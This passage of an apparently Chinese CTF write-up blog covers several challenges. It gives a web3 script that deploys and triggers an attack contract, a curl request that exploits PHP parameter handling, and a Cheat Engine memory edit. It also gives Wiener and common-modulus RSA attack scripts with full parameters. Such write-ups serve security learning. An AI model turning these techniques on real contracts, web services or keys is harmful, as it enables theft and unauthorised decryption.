class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;uint256&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_amount&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;deposit&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;uint256&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_amount&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;withdraw&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;receive&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署攻击合约</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在部署攻击合约...&quot;</span>)</span><br><span class="line">Attack = w3.eth.contract(abi=attack_contract_abi, bytecode=attack_contract_bytecode)</span><br><span class="line">tx = Attack.constructor(target_contract_address).build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">38142</span>,  <span class="comment"># 链ID</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(user_address),</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: user_address</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥签名并发送交易</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待合约部署完成</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;攻击合约部署成功，合约地址: <span class="subst">&#123;receipt.contractAddress&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用部署的攻击合约地址实例化合约</span></span><br><span class="line">attack_contract = w3.eth.contract(address=receipt.contractAddress, abi=attack_contract_abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用攻击合约的 attack 函数发起攻击</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在发起攻击...&quot;</span>)</span><br><span class="line">tx = attack_contract.functions.attack().build_transaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">38142</span>,  <span class="comment"># 链ID</span></span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">2000000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(user_address),</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: user_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>)  <span class="comment"># 发送1 Ether</span></span><br><span class="line">&#125;)</span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, user_private_key)</span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查目标合约是否解决了挑战</span></span><br><span class="line">target_contract = w3.eth.contract(address=target_contract_address, abi=target_contract_abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 isSolved 函数检查挑战状态</span></span><br><span class="line">is_solved = target_contract.functions.isSolved().call()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;挑战是否已解决: <span class="subst">&#123;is_solved&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>由题意得，flag被切分为两段，前一段要求传入参数为L3HSEC,即可返回前半部分flag,后一段要求传入参数为’我是大牛’,且每次传参字符串的长度不得大于1，才会返回后半部分flag<br><img src="/img/CTF/php-1.png"></p><p>对于前半段考察变量和变量名的知识，在cmd中输入</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://f4721935-<span class="number">26</span>b6-<span class="number">414</span>f-<span class="number">9</span>a62-<span class="number">791</span>cda2b3c30.ctf.l3hsec.com/challenge.php -d &quot;_=a&amp;a=b&amp;b=L3HSEC</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/php-2.png"><br>对于后半段考察php中字符串拼接问题，一个中文字符通过URL编码后转换为3个UTF-8编码的字符，将’我是大牛’通过URL编码后，再一个字节一个字节地传递参数，php自动拼接后形成’我是大牛’,巧妙解决了字符串长度不大于1的问题<br><img src="/img/CTF/php-3.png"><br><img src="/img/CTF/php-4.png"><br>前后拼接后成功得到flag</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="听说你是pvz高手"><a href="#听说你是pvz高手" class="headerlink" title="听说你是pvz高手"></a>听说你是pvz高手</h3><p>题目要求收集10000阳光即可获得flag<br>使用 <strong>Cheat Engine (CEx修改器)</strong> 找到程序进程，再尝试扫描当前的阳光数，找到阳光所占有的内存，通过修改内存中阳光数，成功得到flag<br><img src="/img/CTF/pvz-1.png"><br><img src="/img/CTF/pvz-2.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="big-math"><a href="#big-math" class="headerlink" title="big_math"></a>big_math</h3><blockquote><p>RSA加密是一种<strong>非对称加密算法</strong><br>RSA加密使用一对密钥：<strong>公钥</strong>和<strong>私钥</strong>。公钥用于加密，私钥用于解密<br>RSA的安全性基于大数分解的困难性，尤其是大素数乘积的分解问题</p></blockquote><p><strong>RSA加密的基本原理</strong></p><ol><li>密钥生成<br>为了生成 RSA 密钥，需要进行以下步骤：</li></ol><ul><li><strong>选择两个大素数 (p) 和 (q)：</strong></li><li><strong>计算模数 (n)：</strong><br>[<br>n &#x3D; p \times q<br>]<br>模数 (n) 是 RSA 公钥和私钥的核心部分，用于加密和解密。</li><li><strong>计算欧拉函数 (\phi(n))：</strong><br>欧拉函数 (\phi(n)) 是在模 (n) 下的可逆整数个数，对于两个素数 (p) 和 (q)，欧拉函数的值为：<br>[<br>\phi(n) &#x3D; (p-1) \times (q-1)<br>]</li><li><strong>选择公钥指数 (e)：</strong><br>选择一个整数 (e)，使得 (1 &lt; e &lt; \phi(n))，并且 (e) 与 (\phi(n)) 互质（即 (\gcd(e, \phi(n)) &#x3D; 1)）</li><li><strong>计算私钥指数 (d)：</strong><br>私钥指数 (d) 是 (e) 在模 (\phi(n)) 下的逆元，即：<br>[<br>e \cdot d \equiv 1 \ (\text{mod} \ \phi(n))<br>]<br>这个 (d) 通过扩展欧几里得算法计算得到。</li></ul><ol start="2"><li><p>加密过程<br>加密过程使用公钥进行。假设需要加密的消息为 (m)（消息 (m) 是一个整数，且 (0 \leq m &lt; n)），加密公式为：<br>[<br>c &#x3D; m^e \ (\text{mod} \ n)<br>]<br>其中，(c) 是加密后的密文。</p></li><li><p>解密过程<br>解密过程使用私钥进行。解密时，使用加密得到的密文 (c) 通过私钥进行解密，公式为：<br>[<br>m &#x3D; c^d \ (\text{mod} \ n)<br>]<br>解密后得到的 (m) 就是原始消息。</p></li></ol><p>Wiener攻击（Wiener’s Attack）是一种针对RSA加密的攻击方法，专门用于破解当RSA私钥 ( d ) 过小的情况。该攻击由密码学家Michael Wiener在1990年提出。它利用了当私钥 ( d ) 较小时，RSA系统的弱点，能够通过特定的数学技术推导出私钥。</p><p><strong>Wiener攻击基本原理</strong><br>Wiener攻击基于连分数逼近理论。攻击的关键是，当私钥 ( d ) 较小时， ( d ) 和 ( e ) 的比值 ( \frac{d}{n} ) 可以通过连分数逼近的方式很好地近似。通过这一逼近，攻击者可以构造一系列候选的私钥，并验证哪个候选私钥能够破解密文。</p><p><strong>分析题意</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m1=bytes_to_long(flag1)</span><br><span class="line">m2=bytes_to_long(flag2)</span><br><span class="line">p=getPrime(1024)</span><br><span class="line">q=getPrime(1024)</span><br><span class="line">r=getPrime(2048)</span><br><span class="line">t=getPrime(2048)</span><br><span class="line">little_n=p*q</span><br><span class="line">n=p*q*r</span><br></pre></td></tr></table></figure><p>m1,m2是由flag1和flag2通过bytes_to_long()函数转换成的两个整数<br>p,q是长度为1024的素数,r,t是长度为2048的素数<br>little_n和n是模数<br><strong>解题思路</strong><br>利用<strong>Wiener攻击</strong>破解RSA私钥，在 RSA 私钥 d 较小的情况设计的攻击<br>代码核心是通过<strong>连分数逼近</strong>的方法，从公钥指数 e 和模数 n 推导出私钥 d</p><p>（说实话，该工作主要是由gpt完成，具体核心算法不太了解，不过通过本题对RSA加密方式的了解更深入了）</p><p><strong>python程序</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">little_n = <span class="number">30088545050765530423805361878416507393996570826628516885551767012032821735759756922346729483075999478740890396740180776286577993631294405655843348355472462014506667147244720307627201462475792283412817218766998118873677473067104176849657311706442634062420091828926853184205920237951862265182484069649756691839691357916405847978176837008745046642748094275030779471750959877986668422253281400626795828963573920393088749591612716695564149666681604429837724976821672947402732999481879540771777938480505225596566416091698577609111167970146033914320439938709937337918464176949019458189405542377412201071336990086704695932001</span></span><br><span class="line">ciphertext_1 = <span class="number">4437957888497793411974936231134804097124408727940101262533154501417200692919579880947962548717550593697567354996004074082892093231542300979099686519594863569977498876831765076396347598926115862183073685024990864689988238858428295897918744431202362320291015738417428855920053052479809273411609887264443586795095964728239991625582152693909500018661918195404034412467186049173913167545009955896623699305090180468870302233714242619856378640191118517945701566010541415167017293158989288295521065448608130916732093398678710697626416830318362328907904233236575731454083519911431098911284149955444519573629006045554678324518</span></span><br><span class="line">ciphertext_2 = <span class="number">78864561424890770405754552496508735565097767299975292698696817263059870704574252767244750339849821607143039860304278377928922953654619860402709334687968551656512266903178248270944553116215521323821491311662555239829301305000772651190496470417476770564428704238037095240110347750439779101856099345785742200533953669469298415538894433163090058251625858567316364473944123076299230135880825507857770277939412860689895530498381163283821263531273538955506316194191926213707241352871080646562627012054391523644091891727237326335520749063659993188231648389392672191093964160488575369753007731166404854380331830984470657441644838342607582333391874996621339432497442777200974041109474972662502438556188363293907320120566021040878727616875785724243592701260771353665329454661067014678384002070808151070358872996829354884423078897260496009237360165626015366112230594958895261737530922455844000526883743056291880281170954068780564714657040355762723448235762641056698958446508680666476759259974921224980623537386361094690459034558856950725634724109009764690331916406889225273702793795808581259336656477575737512000567280203588771895736081353710119074573273205809318278896389561023955187406736051571629668238556317874245476690747300656637355328544</span></span><br><span class="line">ciphertext_3 = <span class="number">5725077557808157256430942740990569460773383369554273823636176153068467454512823763515647291612402009313693931982637385545689576303886538569510933702499950531946332354820616178601187839652301529137964554627475349002312246937622569844740649433856363144796146222393078023525987286341880380785409632776930595126924756112630243882589976085512471897027381156120513087172923236464367405811882805821186710490261430865849118334490795875278968965387483397523573061251371457251882441660955274348488917840958718541709618303915977686144557627966423963471317515192738334921562091927856956424998965161634322201369720699676347561471675582403160973419462033935866447730620497674055205496875933173254400413581110627294132729326146351739721506814065623387296595138287209163676622201909074010014848172929614143034759743549710300854100952625823552353762197591658982169029599443577415788436359487959114564852534141669094849830099267923384043803436255468847172967932193132489983957589359087823645662055626662973824314495580206380101750792194329854822007590502007055850504474332004464704128354176720739742561430179525179333961608814112175164504198485752771156978208909885458371099313162881602617458059925830364899254441195137785150763268195094621953852200244632416635894291988860065011405757906072849175293480722258929900953859011925277272123913190894980729598985883765586084558378588241413809751317207241875249125287708228797477309231958728561077734778094562357805705275014499804452986728418351199125822789541623527033144636672210156626415595121581925193962797953221837338303410442520344309906567427785930338516724325132154448559539663325603906087819156754108336818594141014769273579814708171319748396233538472420596261105167186637071032111004322390242211983548088973696618482839305923027150374824593812983183773570950561602855654815750454908029219010408866049545122018834</span></span><br><span class="line">public_exponent = <span class="number">18811481222974302204632511369245433479738399576579288811947420564734925886156221373212611102729084374352339031631477899927769759235983596706326584303784559234972552599160858292029188896706945893473255912259624043253888044638166631707857526128138005829891524522002058110222521260201712077964922139704733672451062605244217266782627035293603650126728378938935853574071346654704141663803944530862726643221123184041746714755826882612203166391535425991832801305277555128091105172486311970004713359202828725505765900730826393253715700856299795299501353800751272345390463568402242244426464603165067636889617647460596431388673</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rename the variables for clarity</span></span><br><span class="line">n = little_n</span><br><span class="line">c = ciphertext_1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to convert a rational number x/y to a continued fraction</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_contfrac</span>(<span class="params">x, y</span>):</span><br><span class="line">    a = x // y</span><br><span class="line">    pquotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        pquotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> pquotients</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to calculate the convergents from a continued fraction</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents_from_contfrac</span>(<span class="params">frac</span>):</span><br><span class="line">    convs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to convert a continued fraction back to a rational number</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contfrac_to_rational</span>(<span class="params">frac</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    num = frac[-<span class="number">1</span>]</span><br><span class="line">    denom = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>, -<span class="built_in">len</span>(frac) - <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        num, denom = frac[_] * num + denom, num</span><br><span class="line">    <span class="keyword">return</span> (num, denom)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extended Euclidean Algorithm</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    g, x, y = extended_gcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modular inverse function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_inv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, _ = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> (x + m) % m</span><br><span class="line"></span><br><span class="line"><span class="comment"># Integer square root function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">    x = n</span><br><span class="line">    y = (x + <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> y &lt; x:</span><br><span class="line">        x = y</span><br><span class="line">        y = (x + n // x) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to crack RSA using Wiener&#x27;s attack</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_rsa</span>(<span class="params">e, n</span>):</span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># Check if x^2 - s*x + n = 0 has integer roots</span></span><br><span class="line">            D = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> D &gt;= <span class="number">0</span>:</span><br><span class="line">                sq = isqrt(D)</span><br><span class="line">                <span class="keyword">if</span> sq * sq == D <span class="keyword">and</span> (s + sq) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack the private key</span></span><br><span class="line">private_exponent = crack_rsa(public_exponent, n)</span><br><span class="line">decrypted_message = <span class="built_in">pow</span>(c, private_exponent, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now use the second and third ciphertexts to decrypt further messages</span></span><br><span class="line">private_key_1 = inverse(public_exponent, decrypted_message - <span class="number">1</span>)</span><br><span class="line">message_1 = <span class="built_in">pow</span>(ciphertext_2, private_key_1, decrypted_message)</span><br><span class="line"></span><br><span class="line">private_key_2 = inverse(<span class="number">65537</span>, decrypted_message - <span class="number">1</span>)</span><br><span class="line">message_2 = <span class="built_in">pow</span>(ciphertext_3, private_key_2, decrypted_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Output the result of the decryption</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(message_2))</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/big-math-1.png"></p><h3 id="ezCMA"><a href="#ezCMA" class="headerlink" title="ezCMA"></a>ezCMA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line">flag3 = <span class="built_in">pow</span>(m1,e3,n)</span><br></pre></td></tr></table></figure><p><strong>分析题目</strong><br>m1是由flag转换得到的整数，p,q是两个长度为1024的素数，n是模数<br>其中<strong>有一个明显的特点是</strong>flag1、flag2、flag3是由 <strong>同一个明文(m1)</strong> 通过不同的指数e1、e2、e3和<strong>相同的模数n</strong>生成的，由此联想到共模攻击解出密文<br>且指数e1、e2、e3之间存在<strong>巧妙的联系</strong></p><ul><li>e1 &#x3D; 993627907847 * 1016231455597</li><li>e2 &#x3D; 1016231455597 * 902914473557</li><li>e3 &#x3D; 993627907847 * 902914473557</li></ul><p>共模攻击（Common Modulus Attack）是RSA加密中的一种攻击方式，发生在多个用户使用相同的模数 ( n ) 但有不同的公钥 ( e ) 时。由于RSA的安全性依赖于模数 ( n ) 的唯一性，如果两个或多个用户共享相同的模数，而使用不同的公钥，则会使系统容易受到这种攻击。</p><p><strong>共模攻击的基本原理</strong><br>假设有两个用户，Alice 和 Bob，他们的RSA模数 ( n ) 相同，但公钥不同，分别为 ( e_1 ) 和 ( e_2 )。攻击者假设 Alice 和 Bob 都用各自的公钥加密了相同的明文消息 ( m )，得到密文 ( c_1 &#x3D; m^{e_1} \pmod{n} ) 和 ( c_2 &#x3D; m^{e_2} \pmod{n} )。</p><p>因为 ( c_1 ) 和 ( c_2 ) 都是相同的明文 ( m ) 的幂，且已知 ( e_1 )、( e_2 ) 和 ( n )，攻击者可以通过以下步骤解密消息：</p><ol><li><p><strong>计算扩展欧几里得算法</strong>：通过扩展欧几里得算法找到两个整数 ( a ) 和 ( b )，使得 ( a \times e_1 + b \times e_2 &#x3D; 1 )。</p></li><li><p><strong>利用 ( a ) 和 ( b ) 构造明文</strong>：</p><ul><li>因为 ( m^{e_1} \equiv c_1 \pmod{n} ) 和 ( m^{e_2} \equiv c_2 \pmod{n} )，可以利用 ( a ) 和 ( b ) 的线性组合得到：<br>[<br>m &#x3D; c_1^a \times c_2^b \pmod{n}<br>]</li><li>这样就能通过计算复原原始的明文 ( m )。</li></ul></li></ol><p><strong>整体思想</strong><br>通过给定的三个加密密文 flag1、flag2 和 flag3，以及与每个密文相关的指数 e1、e2 和 e3，来解密出原始消息 m</p><ul><li><p>对 e1 和 e2 进行整除运算，将 e1 和 e2 转化为较小的指数<br>e1&#x3D;1009755935113158588369659&#x2F;&#x2F;1016231455597<br>e2&#x3D;917570089742429076148529&#x2F;&#x2F;1016231455597</p></li><li><p>通过中国剩余定理计算 m1<br>将 flag1 和 flag2 的幂次分别由 x 和 y 进行组合，得到 m1，即：<br>m1&#x3D;pow(c1,x,n)<em>pow(c2,y,n)%n<br>这是通过扩展欧几里得算法求出 x 和 y（满足 e1</em>x + e2*y &#x3D; gcd(e1, e2)）来完成的</p></li><li><p>对 e1 和 e3 进行整除运算，将 e1 和 e3 转化为较小的指数</p></li><li><p>通过与 m1 类似的步骤，使用中国剩余定理计算出 m2，即 m^993627907847 的解。</p></li><li><p>使用最后的 1016231455597 和 993627907847 作为指数，并使用中国剩余定理和扩展欧几里得算法求出 m<br>m&#x3D;pow(m1,x2,n)*pow(m2,y2,n)%n</p></li></ul><p><strong>python程序</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">flag1= <span class="number">8474478534133750496351258439770439219153979952561642731581390416228867640587693486357078135921546443963283105927150253272336059382390513817706698741025531526550326710611170554397057390714665263299882969421138898580414905289818079694175809121588275768717653289810969178070603654027459939946312773093941446287417784032902650734437554613303784830203578240545070093473942475651339619315817364422284273133164774638578085796267096957347085168021778125470616046598013171354398170377063192357733840050955181584705301456304877682550520037398962644014863486620415201523880999542686731895448726980398631515217315286020437688498</span></span><br><span class="line">flag2= <span class="number">3351384523931867313334817228598784440559751009017798910409840467537119821259012274549685345550490291816260612536289106819125192140760817375064269268775476031424892776272822066072079425305661428795671314658531045416112945555811194297108918942072330688307026110408024089214342917098967614776154381488672421957083146560757683623642006092146862507588998409298919637353660377267802188093929938573350202326786505140838600085071746441060977159281922113489848540031614769737591885173161155206855583607310005623436257762906278289722207498226001933784659324565536246902660945534285429590539413563048095506554626251616237676085</span></span><br><span class="line">flag3= <span class="number">5985698167580292228103775342057124425925837097208523314550523309415437277838160594697403652576181505738376124206117744930374928505854417093291293722474344968937532770265145298388658073650787591858476178872911073027696260914967170228919432784475518233719515218760252671051270000581279546881292735906936176213503922783551190771955716934727562595180860790040848587585167859997365531513159440802207174497260444085610261175085531334936547028947562016756271409639098566910202260260565739379965380545050237791613249984011652443416356033660746709478575412073746217796066838355640159345205738259110105894918059407651872299890</span></span><br><span class="line">e1= <span class="number">1009755935113158588369659</span></span><br><span class="line">e2= <span class="number">917570089742429076148529</span></span><br><span class="line">e3= <span class="number">897161019325217314301779</span></span><br><span class="line">n= <span class="number">11295998674923997915943754979924400482910956167036135115104616066253068788768361485681020525394574700945440467310782667910252047979768627604509086553949220752907396584699810630157139575845491574958788530608310999859562983302417094883322550125648741172503117372394024013743440114452080863483618324236843484216327589328115588675048041658149492207605113019716406368620938899561099206060294485156146873711072426006320715336473956395729172889050029370044109346990187611892568329248392149357401050824185160821078105634351600311316865993926248187857295191981143425250483512228653210803684450509179107949521855027236290889869</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新的公钥指数和密文名称</span></span><br><span class="line">exp1 = <span class="number">1009755935113158588369659</span> // <span class="number">1016231455597</span> </span><br><span class="line">exp2 = <span class="number">917570089742429076148529</span> // <span class="number">1016231455597</span> </span><br><span class="line"></span><br><span class="line">cipher1 = flag1 </span><br><span class="line">cipher2 = flag2  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用扩展欧几里得算法计算 exp1 和 exp2 的最大公约数 gcd，以及贝祖系数 x 和 y</span></span><br><span class="line"><span class="comment"># gcd 是 exp1 和 exp2 的最大公约数，x 和 y 是贝祖系数，使得 gcd = exp1 * x + 